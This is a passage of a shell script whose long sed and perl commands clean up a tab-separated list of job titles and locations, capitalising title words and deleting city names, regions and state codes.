s/counsel/Counsel/g; s/cpa/CPA/g; s/Cranberry T//g; s/Cranberry Twp//g; s/credit/Credit/g; s/CREDIT/Credit/g; s/Crm/CRM/g; s/Croton On H//g; 
s/Cross Junction//g; s/Crum Lynne//g; s/Crystal Lake//g; s/Ctr/Center/g; s/Culver City//g; s/Cuyahoga Falls//g; s/\-d/, D/g; s/Daly City//g; s/Dallas//g; 
s/database/Database/g; s/dealer/Dealer/g; s/defense/Defense/g; s/DELIVERY/Delivery/g; s/Del Mar//g; s/Delray Beach//g; s/Deer Park//g; s/Del Rio//g; 
s/DEPUTY/Deputy/g; s/West Des Mo//g; s/Des Moines//g; s/Des Plaines//g; s/DesignatedFederalOfficial/Designated Federal Official/g; s/DESIGNER/Designer/g; 
s/DESIGN/Design/g; s/development/Development/g; s/DEVICES/Devices/g; s/Diamond Bar//g; s/director/Director/g; s/DISCIPLINED/Disciplined/g; 
s/discovery/Discovery/g; s/display/Display/g; s/Dns/DNS/g; s/Downers Grove//g; s/Drexel Hill//g; s/Du Bois//g; s/\-e/, E/g; s/East Brunswick//g; 
s/East Central//g; s/East Coast//g; s/East Douglas//g; s/East Greenbush//g; s/East Hanover//g; s/East Hartford//g; s/East Lansing//g; s/East Peters//g; 
s/East Ohio//g; s/East Stroud//g; s/East Syracuse//g; s/eastern Region//g; s/Eau Claire//g; s/Eden Prairie//g; s/education/Education/g; s/Egg Harbor//g; 
s/Egg Harbor//g; s/El Cajon//g; s/El Centro//g; s/El Monte//g; s/El Paso//g; s/El Segundo//g; s/ELECTRIC/Electric /g; s/ELECTRONICS/Electronics/g; 
s/Port Elizabeth//g; s/Elk Grove V//g; s/Elk Grove//g; s/Ellicott City//g; s/Elk Grove V//g; s/Elkhart//g; s/Elm Grove//g; s/emerging/Emerging/g; 
s/endocrinology/Endocrinology/g; s/ENERGY/Energy/g; s/energy/Energy/g; s/engineer/Engineer/g; s/enterprise/Enterprise/g; s/ETHICS/Ethics/g; 
s/Northern Europe//g; s/EVENT/Event/g; s/executive/Executive/g; s/\-f/, F/g; s/Faa/FAA/g; s/Fairfax Sta//g; s/Fairless Hills//g; s/Fairview He//g; 
s/Fall River//g; s/Falls Church//g; s/Farmington Hls//g; s/fashion/Fashion/g; s/federal/Federal/g; s/FELLOW/Fellow/g; s/Fha/FHA/g; s/FIELD/Field/g; 
s/fillmore/Fillmore/g; s/financial/Financial/g; s/Flat Rock//g; s/FLIGHT/Flight/g; s/Florham Park//g; s/Flower Mound//g; s/Floyds Knobs//g; 
s/for Asia and//g; s/for The Sds Contract //g; s/Forest Hills//g; s/Forest Hill//g; s/Forest Park//g; s/Forked River//g; s/foreign/Foreign/g; 
s/Fort Belvoir//g; s/Fort Bliss//g; s/Fort Collins//g; s/Fort Dodge//g; s/Fort Fairfield//g; s/Fort George//g; s/Fort Huachuca//g; s/Fort Knox//g; 
s/Fort Lauder//g; s/Fort Leaven//g; s/Fort Mill//g; s/Fort Monmouth//g; s/Fort Monroe//g; s/Fort Myers//g; s/Fort Pierce//g; s/Fort Rucker//g; 
s/Fort Walton//g; s/Fort Washin//g; s/Fort Wayne//g; s/Fort Worth//g; s/Fountain Va//g; s/Franklin Park//g; s/Fremont//g; s/Los Fresnos//g; 
s/Front Royal//g; s/Fsa/FSA/g; s/Fso/FSO/g; s/Ft Mitchell//g; s/Ft Worth//g; s/Ft Wright//g; s/FUNCTIONLead/Function Lead/g; s/\-g/, G/g;  s/Gaap/GAAP/g; 
s/Galway 	G//g; s/Garden City//g; s/Garland//g; s/Gig Harbor//g; s/Glen Allen//g; s/Glen Burnie//g; s/Glen Ellyn//g; s/Glen Ridge//g; s/Glen Rock//g; 
s/global/Global/g; s/-go Team//g; s/A Google Company//g; s/Google Access//g; s/Google Adwords//g; s/Google Analytics//g; s/Google Books//g; 
s/Google Brand//g; s/Google Checkout//g; s/Google Earth//g; s/Google Enterprise//g; s/Google Federal//g; s/Google Fiber//g; s/Google Finance//g; 
s/Google Geospatial Services//g; s/Google Glass//g; s/Google Health//g; s/Google Maps//g; s/Google Media Sales//g; s/Google Offers//g; 
s/Google Payments//g; s/Google Payment//g; s/Google Plus//g; s/Google Print//g; s/Google Shopping Express//g; s/Google Shopping//g; 
s/Google Street View//g; s/Google Talk Team//g; s/Google Travel//g; s/Google Ventures//g; s/Google Voice//g; s/Google Wallet//g; s/Google X//g; 
s/Goose Creek//g; s/Granbury//g; s/Grand Forks//g; s/Grand Haven//g; s/Grand Island//g; s/Grand Junction//g; s/Grand Prairie//g; s/Grand Rapids//g; 
s/Granite City//g; s/Grants Pass//g; s/Grayslake//g; s/Great Falls//g; s/Green Bay//g; s/Green Belt//g; s/Greenwood Vlg//g; s/Grosse Ile//g; 
s/Grosse Poin//g; s/group/Group/g; s/Grove City//g; s/Grp/Group/g; s/Gsa/GSA/g; s/Gsm/GSM/g; s/Gulf Breeze//g; s/Gulf Coast//g; s/Gwynn Oak//g; 
s/\-h/, H/g; s/Hampton Cove//g; s/Hampton Roads//g; s/Harbor City//g; s/Harpers Ferry//g; s/Harrison City//g; s/New Hartford//g; s/West Hartford//g; 
s/Hanscom Afb//g; s/hazard/Hazard/g; s/Hazel Park//g; s/Hd/HD/g; s/\/Head/, Head/g; s/Hermosa Beach//g; s/Highland Hls//g; s/Highland Park//g; 
s/Hilton Head//g; s/Hoffman Est//g; s/West Hollywood//g; s/Hollywood//g; s/Homer Glen//g; s/Homewood//g; s/Hot Springs//g; s/Hq/HQ/g; s/-human/, Human/g; 
s/Huntingtn Bch//g; s/Hurlburt Field//g; s/\-i/, I/g; s/Idaho Falls//g; s/Iii/III/g; s/Ii/II/g; s/IMPORT/Import/g; s/-in Consulting firm//g; 
s/-in Sydney//g; s/Indian Harb//g; s/Indianapolis//g; s/information/Information/g; s/Information Technology/IT/g; s/institutional/Institutional/g; 
s/INSTRUMENT/Instrument/g; s/insurance/Insurance/g; s/intelligence/Intelligence/g; s/international/International/g; s/Inver Grove//g; s/Iselin//g; 
s/Issm/ISSM/g; s/Itenterpriseprojectmanager/IT Enterprise Project Manager/g; s/Italy//g; s/\-j/, J/g; s/Jane Lew//g; s/Jefferson City//g; 
s/Jersey City//g; s/Johnson City//g; s/\-k/, K/g; s/Kansas City//g; s/KANSS CITY//g; s/Keego Harbor//g; s/Kennett Square//g; s/King George//g; 
s/King Of Pru//g; s/King Of Pru//g; s/Kings Bay//g; s/Kings Park//g; s/Kitty Hawk//g; s/\-l/, L/g; s/La Follette//g; s/La Grange Park//g; s/La Grange//g; 
s/La Jolla//g; s/La Mesa//g; s/La Palma//g; s/La Plata//g; s/La Pocatiere//g; s/Laguna Hills//g; s/Laguna Niguel//g; s/Lake Charles//g; 
s/Salt Lake City//g; s/Lake City//g; s/Lake Geneva//g; s/Lake Havasu//g; s/Lake Mary//g; s/Lake Montezuma//g; s/Lake Oswego//g; s/landowner/Landowner/g; 
s/Las Cruces//g; s/LEADERSHIP MENTORING CHAIR/Leadership Mentoring Chair/g; s/North Las V//g; s/Las Vegas//g; s/Latin America North//g; 
s/Latin America//g; s/Mount Laurel//g; s/League City//g; s/LEARNING/Learning/g; s/legal/Legal/g; s/lending/Lending/g; s/Lexington Park//g; 
s/Linthicum H//g; s/Little Rock//g; s/Llc/LLC/g; s/New London//g; s/Lone Tree//g; s/Long Beach//g; s/Long Valley//g; s/Logan Township//g; 
s/Los Angeles//g; s/Los Lunas//g; s/Loves Park//g; s/Lusby//g; s/Lvl/Level/g; s/\-m/, M/g; s/Macquarie Park//g; s/MAINFRAME/ Mainframe/g; 
s/MANAGER/Manager/g; s/Manager\//Manager, /g; s/Mangr/Manager/g; s/manager/Manager/g; s/mangr/Manager/g; s/Manhattan B//g; 
s/manufacturing/Manufacturing/g; s/MANUFACTURING/Manufacturing/g; s/Maple Grove//g; s/Maple Heights//g; s/Maple Shade//g; s/March Air R//g; 
s/MarketingProductionManager/Marketing Production Manager/g; s/Marina Del Rey//g; s/market/Market/g; s/master/Master/g; s/materials/Materials/g; 
s/Mayfield West//g; s/Mays Landing//g; s/Mba/MBA/g; s/Mc Lean//g; s/Mc Coll//g; s/Mc Cordsville//g; s/Mc Kees Rocks//g; s/Mcse/MCSE/g; 
s/MECHANIC/Mechanic/g; s/medical/Medical/g; s/Melbourne B//g; s/Melbourne 	VIC//g; s/Melrose Park//g; s/Memphis//g; s/Menlo Park//g; s/Merritt Island//g; 
s/Metro Jersey District//g; s/Miami Beach//g; s/Mid-Atlantic//g; s/-Middle East//g; s/Middle East//g; s/Middle River//g; s/Upper Midwest//g; 
s/Millstone T//g; s/Milwaukee//g; s/Mira Loma//g; s/Mississauga//g; s/MOBILITY/Mobility/g; s/model/Model/g; s/Moncks Corner//g; s/Moncton//g; 
s/Montreal//g; s/Monroe Town//g; s/Moor Row//g; s/Moreno Valley//g; s/mortgage/Mortgage/g; s/Morgan Hill//g; s/Morris Plains//g; s/Moseley//g; 
s/Moss Point//g; s/MOTOROLA/Motorola/g; s/motorola/Motorola/g; s/Mound City//g; s/Mount Airy//g; s/Mount Holly//g; s/Mount Laurel//g; s/Mount Morrs//g; 
s/Mount Pleasant//g; s/Mount Pocono//g; s/Mount Prospect//g; s/Mount Storm//g; s/Mount Vernon//g; s/Mount Weather//g; s/mountain Region//g; 
s/Mountain States//g; s/Mountain View//g; s/Mount Waverley//g; s/Muscle Shoals//g; s/Mullica Hill//g; s/MULTI/Multi/g; s/Munroe Falls//g; 
s/music/Music/g; s/MyHR/HR/g; s/Myrtle Beach//g; s/\-n/, N/g; s/National City//g; s/Naval Anaco//g; s/navy/Navy/g; s/Needham Hei//g; 
s/negotiator/Negotiator/g; s/New Canton//g; s/New Castle//g; s/New Church//g; s/New Cumberland//g; s/New Delhi//g; s/New Haven//g; s/New Malden//g; 
s/New Lenox//g; s/New Market//g; s/New Martins//g; s/New Orleans//g; s/New Port Ri//g; s/New Stanton//g; s/New Town//g; s/New York Office//g; 
s/New York//g; s/New Zealand//g; s/Newbury Park//g; s/Newport Beach//g; s/Newport News//g; s/Niagara Falls//g; s/North America //g; 
s/North and Central//g; s/North Baldwin//g; s/North Bergen//g; s/North Canton//g; s/North Charl//g; s/North East//g; s/North Highl//g; s/North Holly//g; 
s/North Kings//g; s/North Myrtl//g; s/North Olmsted//g; s/North Royalton//g; s/North Vernon//g; s/North Wales//g; s/North York//g; s/northern/Northern/g; 
s/Nsa/NSA/g; s/Nso/NSO/g; s/\-o/, O/g; s/O Fallon//g; s/Oak Brook//g; s/Oak Creek//g; s/Oak Hill//g; s/Oak Park//g; s/Oak Ridge//g; s/Oak View//g; 
s/Oakbrook Te//g; s/Ocean City//g; s/Ocean Grove//g; s/Ocean Springs//g; s/officer/Officer/g; s/Officer\//Officer, /g; s/OFFICE/Office/g; 
s/office/Office/g; s/Offutt A F B//g; s/Oklahoma City//g; s/Old Bridge//g; s/Olmsted Falls//g; s/Onited States//g; s/online/Online/g; 
s/operations/Operations/g; s/Orange Park//g; s/oriented/Oriented/g; s/Orland Park//g; s/Overland Park//g; s/Owings Mills//g; s/Oxon Hill//g; s/\-p/, P/g; 
s/PACKAGING/Packaging/g; s/PACIFIC NORTHWEST//g; s/Pacific Southwest Region //g; s/Palm Bay//g; s/Palm Beach//g; s/Palm Coast//g; s/Palm Harbor//g; 
s/Palo Alto//g; s/Palos Hills//g; s/Pompano Beach//g; s/Panama City//g; s/paralegal/Paralegal/g; s/parent/Parent/g; s/Park Forest//g; s/Park Ridge//g; 
s/PATROL/Patrol/g; s/Patuxent River//g; s/payments/Payments/g; s/Pc/PC/g; s/Pearl City//g; s/Peachtree City//g; s/Pell City//g; s/Pembroke Pines//g; 
s/Perry Hall//g; s/physical/Physical/g; s/Pico Rivera//g; s/Pine Grove//g; s/Pinellas Park//g; s/Pj/PJ/g; s/PLANNER/Planner/g; s/PLANNING/Planning/g; 
s/platform/Platform/g; s/PMo/PMO/g; s/PMp//g; s/PMP, //g; s/Pmp/PMP/g; s/Pm/PM/g; s/Point Pleasant//g; s/PMo/PMO/g; s/Ponca City//g; s/Ponte Vedra//g; 
s/Poplar Branch//g; s/PortDirector/Port Director/g; s/Port Allen//g; s/Port Deposit//g; s/Port Orange//g; s/Port Orchard//g; 
s/PortDirector/Port Directorg/g; s/portfolio/Portfolio/g; s/Powder Springs//g; s/premium/Premium/g; s/Prescott Va//g; s/President -/President, /g; 
s/President-/President, /g; s/President\//President, /g; s/president/President/g; s/Princess Anne//g; s/principal/Principal/g; s/Prineville//g; 
s/private/Private/g; s/PROCESS/Process/g; s/procurement/Procurement/g; s/PROCUREMENT/Procurement/g; s/producer/Producer/g; s/PRODUCER/Producer/g; 
s/PROGRAMMING/Programming/g; s/program/Program/g; s/project/Project/g; s/Prospect Park//g; s/\-q/, Q/g; s/\-r/, R/g; s/R and D/R&D/g; 
s/RADIOLOGY/Radiology/g; s/Rancho Palo//g; s/Ransom Canyon//g; s/Rapid City//g; s/real/Real/g; s/receives/Receives/g; s/recreation/Recreation/g; 
s/Recrui-ter/Recruiter/g; s/Recruiter\//Recruiter, /g; s/Red Bank//g; s/Redondo Beach//g; s/Redwood City//g; s/regional/Regional/g; 
s/relationship/Relationship/g; s/reliability/Reliability/g; s/retail/Retail/g; s/retirement/Retirement/g; s/RFid/RFID/g; s/Rf/RF/g; s/New Richmond//g; 
s/River Edge//g; s/Rllng Hls Est//g; s/Roanoke Rapids//g; s/Rochester Hls//g; s/Rocky Hill//g; s/Rocky Mount//g; s/Rocky River//g; s/Rock Springs//g; 
s/Rohnert Park//g; s/Rolling Mea//g; s/Round Lk Bch//g; s/Round Rock//g; s/Royal Oak//g; s/\-s/, S/g; s/SAFETY/Safety/g; s/Saint-laurent//g; 
s/Saint Albans//g; s/Saint Ann//g; s/Saint Augus//g; s/Saint Charles//g; s/Saint Clair//g; s/Saint Cloud//g; s/Saint John//g; s/Saint Joseph//g; 
s/Saint Louis//g; s/Saint Paul//g; s/Saint Peter//g; s/Saint Rose//g; s/Saint Simon//g; s/Salem Gandp East//g; s/sales/Sales/g; s/Salt Lake City//g; 
s/San Antonio//g; s/San Bernardino//g; s/San Bruno//g; s/San Carlos//g; s/San Clemente//g; s/San Diego//g; s/San Dimas//g; s/san Francisco Bay//g; 
s/San Francisco//g; s/San Jose//g; s/San Juan//g; s/San Manager/SAN Manager/g; s/San Marcos//g; s/San Mateo//g; s/San Pedro//g; s/San Ramon//g; 
s/Santa Ana//g; s/Santa Barbara//g; s/Santa Clara//g; s/Santa Clarita//g; s/Santa Fe//g; s/Santa Isabel//g; s/Santa Maria//g; s/Santa Monica//g; 
s/Santa Rosa//g; s/Sao Paulo//g; s/Saratoga Sp//g; s/Schiller Park//g; s/scholar/Scholar/g; s/scientist/Scientist/g; s/SCIENTIST/Scientist/g; 
s/SCONSUTANT/Consultant/g; s/Scotch Plains//g; s/Scott Afb//g; s/Scott Air F//g; s/Scotts Valley//g; s/Seal Beach//g; s/SECURITY/Security/g; 
s/security/Security/g; s/\/Senior/, Senior/g; s/senior/Senior/g; s/SerVices/Services/g; s/service/Service/g; s/Severna Park//g; s/Sftwr/Software/g; 
s/Sheffield Vlg//g; s/Shelby Town//g; s/Sherman Oaks//g; s/Show Low//g; s/Sierra Vista//g; s/Silver Spring//g; s/Sioux City//g; s/Snr/Senior/g; 
s/Sioux Falls//g; s/smart/Smart/g; s/Smb/SMB/g; s/Sms/SMS/g; s/social/Social/g; s/Solana Beach//g; s/Southeast Region//g; s/Southern and  , ,//g; 
s/Southern Pines//g; s/South Africa//g; s/South Bend//g; s/South Burli//g; s/South Central//g; s/South Dakota//g; s/South East//g; s/South-east//g; 
s/South Orange//g; s/South San F//g; s/South Lake//g; s/South Ozone//g; s/South Plain//g; s/South River//g; s/South East Asia//g; s/South-east Asia//g; 
s/space/Space/g; s/spain/Spain/g; s/Spring City//g; s/Sql/SQL/g; s/SrBranch/Senior Branch/g; s/SrSales/Senior Sales/g; s/Ssl/SSL/g; s/St. Asaph//g; 
s/St Augustine//g; s/St Charles//g; s/St Johnsbury//g; s/St Leonards//g; s/St Petersburg//g; s/St Thomas//g; s/State College//g; s/Stennis Spa//g; 
s/Stephens City//g; s/Sterling He//g; s/Stevens Point//g; s/Stf/Staff/g; s/STOCK/Stock/g; s/Stone Harbor//g; s/Stone Mountain//g; 
s/strategic/Strategic/g; s/subsidiary/Subsidiary/g; s/Sugar Land//g; s/Sugar Grove//g; s/supply/Supply/g; s/support/Support/g; s/Sydney 	NSW//g; 
s/\-t/, T/g; s/Takoma Park//g; s/Tall Timbers//g; s/teacher/Teacher/g; s/TEAM/Team/g; s/Teaneck//g; s/technical/Technical/g; s/technology/Technology/g; 
s/Technologymanager/Technology Manager/g; s/TELECOMMUNICATIONS/Telecommunications/g; s/television/Television/g; s/testing/Testing/g; s/TEST/Test/g; 
s/Thailand and Philippines//g; s/The Dalles//g; s/Thousand Oaks//g; s/Timber Lake//g; s/Tipp City//g; s/To Rick//g; s/Township Of//g; 
s/Trabuco Canyon//g; s/TRADEMARKS/Trademarks/g; s/trainer/Trainer/g; s/TRANSPORTATION/Transportation/g; s/treasury/Treasury/g; s/Tunbridge W//g; 
s/Twin Falls//g; s/\-u/, U/g; s/UK//g; s/U.S.//g; s/UNDERWRITER/Underwriter/g; s/Union Ban//g; s/Union City//g; s/Union Office//g; s/United Kingdom//g; 
s/United States//g; s/Universal City//g; s/university/University/g; s/Upper Chich//g; s/Upper Marlboro//g; s/Uscg/USCG/g; s/UTILITIES/Utilities/g; 
s/\-v/, V/g; s/valve/Valve/g; s/Valley Stream//g; s/Van Nuys//g; s/vendor/Vendor/g; s/Vernon Hills//g; s/Vero Beach//g; s/Versailles//g; s/Vii/VII/g; 
s/Vi /VI/g; s/Vice-President/Vice President/g; s/Vicepresident/Vice President/g; s/Virginia Beach//g; s/La Vista//g; s/Voip/VoIP/g; s/\-w/, W/g; 
s/Walled Lake//g; s/Wallops Island//g; s/Walnut Creek//g; s/Warm Springs//g; s/Warner Robins//g; s/wealth/Wealth/g; s/West Bloomf//g; s/West Chester//g; 
s/West Columbia//g; s/West Dundee//g; s/West Harrison//g; s/West Linn//g; s/West Mifflin//g; s/West Nyack//g; s/West Orange//g; s/West Palm B//g; 
s/West Paterson//g; s/west Region//g; s/West Sacram//g; s/West Spring//g; s/Western Spr//g; s/West Orange//g; s/White Lake//g; s/White Plains//g; 
s/White River//g; s/Whiteman Ai//g; s/Whitmore Lake//g; s/Williston Park//g; s/Willow Grove//g; s/South Windsor//g; s/Windsor Locks//g; 
s/Windsor Mill//g; s/Winston Salem//g; s/Winter Park//g; s/Winter Springs//g; s/Wood Dale//g; s/Woodland Hills//g; s/Woodland Park//g; 
s/worldwide/Worldwide/g; s/\-x/, X/g; s/\-y/, Y/g; s/\-z/, Z/g; 

s/AK //g; s/AL //g; s/AR //g; s/AZ //g; s/CA //g; s/CO //g; s/CT //g; s/DC //g; s/DE //g; s/FL //g; s/GA //g; s/HI //g; s/IA //g; s/ID //g; s/IL //g; 
s/IN //g; s/KA //g; s/KS //g; s/KY //g; s/LA //g; s/MA //g; s/ME //g; s/MD //g; s/MI //g; s/MO //g; s/MN //g; s/MS //g; s/MT //g; s/NC //g; s/NE //g; 
s/ND //g; s/NH //g; s/NJ //g; s/NM //g; s/NV //g; s/NY //g; s/OH //g; s/OK //g; s/ON //g; s/OR //g; s/PA //g; s/PR //g; s/QC //g; s/RI //g; s/SC //g; 
s/SD //g; s/TN //g; s/TX //g; s/Uk //g; s/UP //g; s/UT //g; s/VA //g; s/VT //g; s/WA //g; s/WI //g; s/WV //g; s/WY //g; s/AP //g; s/DL //g; s/NB //g; 
s/MH //g; s/[0-9]\{2\}\/[0-9]\{2\}\/[0-9]\{2\}//g; s/^[ \tmp]*//g' > tmp

# Author: Ben Wood
perl -ne 'if ($_ =~ /(.*?)\t\s*(.*)/) {printf("%-40s%s\n",$1,$2);}' tmp | sed 's/[ \t]*$//g' | sort > tmp2

cat tmp2 | sed 's/   -/ -/g; s/,  /, /g; s/, , , , //g; s/, , , //g; s/, , /, /g; s/,$//g; s/\/$//g; s/-$//g; s/Aberdeen$//g; s/Abilene$//g; 
s/Abingdon$//g; s/Abington$//g; s/Acworth$//g; s/Adamstown$//g; s/Addison$//g; s/Adena$//g; s/Adkins$//g; s/AdSense$//g; s/Adwords$//g; s/Africa$//g; 
s/Aguadilla$//g; s/Ainsworth$//g; s/Akron$//g; s/Alabaster$//g; s/Albany$//g; s/Albuquerque$//g; s/Aldershot$//g; s/Alexandria$//g; s/Allegan$//g; 
s/Allentown$//g; s/Alma$//g; s/Alpena$//g; s/Alpharetta$//g; s/Altavista$//g; s/Americas$//g; s/Americus$//g; s/Ambler$//g; s/Amherst$//g; 
s/Amissville$//g; s/Amsterdam$//g; s/Anaheim$//g; s/Anchorage$//g; s/Anderson$//g; s/Andover$//g; s/Annandale$//g; s/Annapolis$//g; s/Anniston$//g; 
s/Antioch$//g; s/Apalachin$//g; s/Apex$//g; s/Apopka$//g; s/Arcadia$//g; s/Archbald$//g; s/Argentina$//g; s/Arlington$//g; s/Armonk$//g; s/Arnold$//g; 
s/Artesia$//g; s/Arvada$//g; s/Ashburn$//g; s/Ashland$//g; s/Ashtabula$//g; s/Asia$//g; s/Athens$//g; s/Atlanta$//g; s/Atoka$//g; s/Attleboro$//g; 
s/Auburn$//g; s/Augusta$//g; s/Aurora$//g; s/Austell$//g; s/Austin$//g; s/Australia$//g; s/Avondale$//g; s/Avon$//g; s/Azle$//g; s/Azusa$//g; 
s/Babylon$//g; s/Bakersfield$//g; s/Bainbridge$//g; s/Baltimore$//g; s/Banbury$//g; s/Bangalore$//g; s/Bangor$//g; s/Barboursville$//g; 
s/Barbourville$//g; s/Bardstown$//g; s/Barrington$//g; s/Bartlesville$//g; s/Bartlett$//g; s/Barton$//g; s/Basingstoke$//g; s/Batavia$//g; 
s/Batesville$//g; s/Bath$//g; s/Bayside$//g; s/Beachwood$//g; s/Beckley//g; s/Beaver$//g; s/Berlin$//g; s/Blaine$//g; s/Boron$//g; s/Boston$//g; 
s/Bowie$//g; s/Beaumont$//g; s/Beaverton$//g; s/Bedford$//g; s/Belcamp$//g; s/Belgium$//g; s/Bellaire$//g; s/Belleville$//g; s/Bellevue$//g; 
s/Bellflower$//g; s/Beltsville$//g; s/Belux$//g; s/Benelux$//g; s/Benicia$//g; s/Bensalem$//g; s/Bensenville$//g; s/Berkeley$//g; s/Berryville$//g; 
s/Berwyn$//g; s/Bethesda$//g; s/Bethlehem$//g; s/Bethpage$//g; s/Billerica$//g; s/Biloxi$//g; s/Binghamton$//g; s/Birmingham$//g; s/Bismarck$//g; 
s/Bison$//g; s/Blacksburg$//g; s/Bloomfield$//g; s/Bloomingdale$//g; s/Bloomington$//g; s/Bloomsburg$//g; s/Bluemont$//g; s/Blythewood$//g; 
s/Bohemia$//g; s/Boise$//g; s/Bolingbrook$//g; s/Bordentown$//g; s/Bothell$//g; s/Boulder$//g; s/Bourne$//g; s/Boxborough$//g; s/Boyds$//g; 
s/Bradenton$//g; s/Brampton$//g; s/Brandenburg$//g; s/Brandywine$//g; s/Brazil$//g; s/Brecksville$//g; s/Brentwood$//g; s/Bridgeport$//g; 
s/Bridgewater$//g; s/Brisbane$//g; s/Bristol$//g; s/Brooklyn$//g; s/Brookpark$//g; s/Brookwood$//g; s/Brownstown$//g; s/Buckeye$//g; s/Burbank$//g; 
s/Burlington$//g; s/Burnsville$//g; s/Burtonsville$//g; s/Brockton$//g; s/Broomfield$//g; s/Bristow$//g; s/Brunswick$//g; s/Buena$//g; s/Buffalo$//g; 
s/Burke$//g; s/Burleson$//g; s/Burlingame$//g; s/Calabasas$//g; s/Calexico$//g; s/California$//g; s/Califon$//g; s/Calpella$//g; s/Camarillo$//g; 
s/Cambridge$//g; s/Camden$//g; s/Campbell$//g; s/Canada$//g; s/Canfield$//g; s/Canonsburg$//g; s/Canton$//g; s/Capitola$//g; s/Captiva$//g; 
s/Carlisle$//g; s/Carlsbad$//g; s/Carnegie$//g; s/Carpinteria$//g; s/Carrollton$//g; s/Carson$//g; s/Cary$//g; s/Cantonment$//g; s/Casper$//g; 
s/Castaic$//g; s/Catawba$//g; s/Catonsville$//g; s/Cayce$//g; s/Cedar Park$//g; s/Centreville$//g; s/Cerritos$//g; s/Chalmette$//g; s/Chambersburg$//g; 
s/Champaign$//g; s/Champlain$//g; s/Chandler$//g; s/Chantilly$//g; s/Chappaqua$//g; s/Charleston$//g; s/Charlestown$//g; s/Charlottesvle$//g; 
s/Charlotte$//g; s/Chatswood$//g; s/Chatsworth$//g; s/Chattanooga$//g; s/Chelmsford$//g; s/Cheltenham$//g; s/Chennai$//g; s/Chertsey$//g; 
s/Chesapeake$//g; s/Chesterfield$//g; s/Chester$//g; s/Cheyenne$//g; s/chicago$//g; s/Chicago$//g; s/CHICAGO$//g; s/Chorley$//g; s/Christiana$//g; 
s/Christiansburg$//g; s/Cibolo$//g; s/Cicero$//g; s/Cincinnati$//g; s/Claremont$//g; s/Clarendon$//g; s/Clarksburg$//g; s/Clarkston$//g; 
s/Clarksville$//g; s/Clawson$//g; s/Claymont$//g; s/Clayton$//g; s/Clearfield$//g; s/Clearwater$//g; s/Clementon$//g; s/Clendenin$//g; s/Clermont$//g; 
s/Cleveland$//g; s/Clifton$//g; s/Clinton$//g; s/Clover$//g; s/Cockeysville$//g; s/Cocoa$//g; s/Colchester$//g; s/Colleyville$//g; s/Collinsville$//g; 
s/Colorado$//g; s/Columbia$//g; s/Columbus$//g; s/Converse$//g; s/Commack$//g; s/Concord$//g; s/Conifer$//g; s/Conroe$//g; s/Conshohocken$//g; 
s/Conyers$//g; s/Cookeville$//g; s/Coopersburg$//g; s/Cooperstown$//g; s/Coppell$//g; s/Copperopolis$//g; s/Coraopolis$//g; s/Corbin$//g; s/Cordova$//g; 
s/Corona$//g; s/Corsicana$//g; s/Cortland$//g; s/Countryside$//g; s/Covington$//g; s/Crane$//g; s/Cranston$//g; s/Cresskill$//g; s/Crofton$//g; 
s/Crossville$//g; s/Crownsville$//g; s/Csc$//g; s/CSC$//g; s/Culpeper$//g; s/Cumberland$//g; s/Cupertino$//g; s/Cypress$//g; s/D$//g; s/Dahlgren$//g; 
s/Daleville$//g; s/DALLAS$//g; s/Dallas$//g; s/Danbury$//g; s/Danville$//g; s/Darby$//g; s/Davenport$//g; s/Daventry$//g; s/Davis$//g; s/Dayton$//g; 
s/Decatur$//g; s/Defiance$//g; s/Delaplane$//g; s/Denton$//g; s/Denver$//g; s/Deerfield$//g; s/Delmont$//g; s/DENVER$//g; s/Deptford$//g; s/Derby$//g; 
s/Desoto$//g; s/Destiny$//g; s/Destin$//g; s/Detroit$//g; s/Devens$//g; s/Dhs$//g; s/Douglasville$//g; s/Douglas$//g; s/Dover$//g; s/Doylestown$//g; 
s/Drummondville$//g; s/Dublin$//g; s/Dulles$//g; s/Duluth$//g; s/Dumas$//g; s/Dumfries$//g; s/Duncan$//g; s/Dundee$//g; s/Dunkirk$//g; s/Dupree$//g; 
s/Durango$//g; s/Durham$//g; s/Eads$//g; s/Eastern$//g; s/Easton$//g; s/Eatontown$//g; s/Edgecomb$//g; s/Edgewater$//g; s/Edgewood$//g; s/Edinburgh$//g; 
s/Edinburg$//g; s/Edison$//g; s/Edwards$//g; s/Elbert$//g; s/Elgin$//g; s/Elizabethtown$//g; s/Elizabeth$//g; s/Elkhart$//g; s/Elkhorn$//g; 
s/Elkridge$//g; s/Elkton$//g; s/Elmsford$//g; s/Eloy$//g; s/Elwood$//g; s/Elyria$//g; s/EMEA$//g; s/Emea$//g; s/Emeryville$//g; s/Emmitsburg$//g; 
s/Emporia$//g; s/Encino$//g; s/Endicott$//g; s/Englewood$//g; s/Englishtown$//g; s/Ennis$//g; s/Erie$//g; s/Escondido$//g; s/Eugene$//g; s/Euless$//g; 
s/Europe$//g; s/Evanston$//g; s/Evansville$//g; s/Evans$//g; s/Exton$//g; s/Eynon$//g; s/Fairbanks$//g; s/Fairborn$//g; s/Fairfax$//g; s/Fairfield$//g; 
s/Fairmont$//g; s/Fairview$//g; s/Fallbrook$//g; s/Fallston$//g; s/Fareham$//g; s/Fargo$//g; s/Farmingdale$//g; s/Farmington$//g; s/Farnboroug$h//g; 
s/Farnham$//g; s/Fayetteville$//g; s/Feastervill$//g; s/Feltham$//g; s/Findlay$//g; s/Finksburg$//g; s/Fishers$//g; s/Fisherville$//g; s/Flemington$//g; 
s/Florence$//g; s/Floresville$//g; s/Flossmoor$//g; s/Flourtown$//g; s/Flowood$//g; s/Fogelsville$//g; s/for$//g; s/Forsyth$//g; s/france$//g; 
s/Framingham$//g; s/Frankfort$//g; s/Franklin$//g; s/Fredericksburg$//g; s/Frederick$//g; s/Freehold$//g; s/Fremont$//g; s/Fresno$//g; s/Frisco$//g; 
s/Fullerton$//g; s/Gainesville$//g; s/Gaithersburg$//g; s/Gardena$//g; s/Gardners$//g; s/Garland$//g; s/Gastonia$//g; s/Gatineau$//g; s/Gateille$//g; 
s/Genesee$//g; s/Geneva$//g; s/Germantown$//g; s/Germany$//g; s/GERMANY$//g; s/Geyserville$//g; s/Gibsonia$//g; s/Gibsonville$//g; s/Glasgow$//g; 
s/Glastonbury$//g; s/Glencoe$//g; s/Glendale$//g; s/Glendora$//g; s/Glenside$//g; s/GMBH$//g; s/Gnadenhutten$//g; s/Goleta$//g; s/Goodyear$//g; 
s/Google$//g; s/-google$//g; s/Grafton$//g; s/Granbury$//g; s/Granville$//g; s/Grayslake$//g; s/Greeley$//g; s/Greenbelt$//g; s/Greenbrae$//g; 
